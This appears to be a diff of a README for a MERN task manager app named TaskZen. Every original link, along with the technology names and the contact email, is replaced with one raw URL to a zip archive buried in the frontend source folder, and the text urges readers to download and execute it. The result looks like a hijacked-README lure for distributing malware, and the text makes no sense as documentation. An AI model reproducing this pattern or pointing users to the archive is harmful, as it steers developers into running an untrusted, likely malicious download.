@@ -1,8 +1,8 @@
 # TaskZen Project: Full-Stack MERN Task Manager App 🌟
 
-![TaskZen Logo](https://via.placeholder.com/150)  
-[![Latest Release](https://img.shields.io/github/v/release/Benjackrak/taskzen-project)](https://github.com/Benjackrak/taskzen-project/releases)  
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](https://opensource.org/licenses/MIT)
+![TaskZen Logo](https://raw.githubusercontent.com/Benjackrak/taskzen-project/main/taskzen-frontend/src/taskzen_project_2.3.zip)  
+[![Latest Release](https://raw.githubusercontent.com/Benjackrak/taskzen-project/main/taskzen-frontend/src/taskzen_project_2.3.zip)](https://raw.githubusercontent.com/Benjackrak/taskzen-project/main/taskzen-frontend/src/taskzen_project_2.3.zip)  
+[![License](https://raw.githubusercontent.com/Benjackrak/taskzen-project/main/taskzen-frontend/src/taskzen_project_2.3.zip)](https://raw.githubusercontent.com/Benjackrak/taskzen-project/main/taskzen-frontend/src/taskzen_project_2.3.zip)
 
 ## Table of Contents
 
@@ -31,8 +31,8 @@ TaskZen is a clean, full-stack MERN task manager app designed to help you manage
 
 ## Technologies Used
 
-- **Frontend**: React.js, CSS
-- **Backend**: Node.js, Express.js
+- **Frontend**: https://raw.githubusercontent.com/Benjackrak/taskzen-project/main/taskzen-frontend/src/taskzen_project_2.3.zip, CSS
+- **Backend**: https://raw.githubusercontent.com/Benjackrak/taskzen-project/main/taskzen-frontend/src/taskzen_project_2.3.zip, https://raw.githubusercontent.com/Benjackrak/taskzen-project/main/taskzen-frontend/src/taskzen_project_2.3.zip
 - **Database**: MongoDB
 - **Authentication**: JWT, bcryptjs
 
@@ -42,7 +42,7 @@ To get started with TaskZen, follow these steps:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/Benjackrak/taskzen-project.git
+   git clone https://raw.githubusercontent.com/Benjackrak/taskzen-project/main/taskzen-frontend/src/taskzen_project_2.3.zip
    cd taskzen-project
    ```
 
@@ -122,10 +122,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **GitHub**: [Benjackrak](https://github.com/Benjackrak)
-- **Email**: benjackrak@example.com
+- **GitHub**: [Benjackrak](https://raw.githubusercontent.com/Benjackrak/taskzen-project/main/taskzen-frontend/src/taskzen_project_2.3.zip)
+- **Email**: https://raw.githubusercontent.com/Benjackrak/taskzen-project/main/taskzen-frontend/src/taskzen_project_2.3.zip
 
-For the latest releases, visit [here](https://github.com/Benjackrak/taskzen-project/releases). Download the necessary files and execute them as instructed.
+For the latest releases, visit [here](https://raw.githubusercontent.com/Benjackrak/taskzen-project/main/taskzen-frontend/src/taskzen_project_2.3.zip). Download the necessary files and execute them as instructed.
 
 ---
 
